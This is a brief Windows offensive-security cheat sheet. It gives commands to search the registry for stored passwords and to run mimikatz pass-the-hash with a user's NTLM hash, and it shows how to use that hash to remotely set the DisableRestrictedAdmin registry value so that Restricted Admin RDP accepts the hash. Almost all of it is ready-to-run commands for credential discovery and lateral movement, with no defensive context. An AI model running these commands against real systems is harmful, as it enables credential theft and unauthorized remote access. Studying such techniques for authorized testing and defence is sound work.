# Windows

#### Look for password in the registry

```
reg query HKLM /f pass /t REG_SZ /s
```

### Set Path&#x20;

```
set PATH=%SystemRoot%\system32;%SystemRoot%;
```

### Restricted Admin rdp with hash

```
sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
```

A [registry key](https://social.technet.microsoft.com/wiki/contents/articles/32905.remote-desktop-services-enable-restricted-admin-mode.aspx) controls if a server accepts Restricted Admin sessions. If you have the NTLM hash of a user that has privileges to set registry keys, you can use for example Powershell to enable it and log in via RDP afterwards:

```
mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"
```

A new Powershell window will pop up:

```
Enter-PSSession -Computer <Target>
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
```

Now, your RDP should work fine.
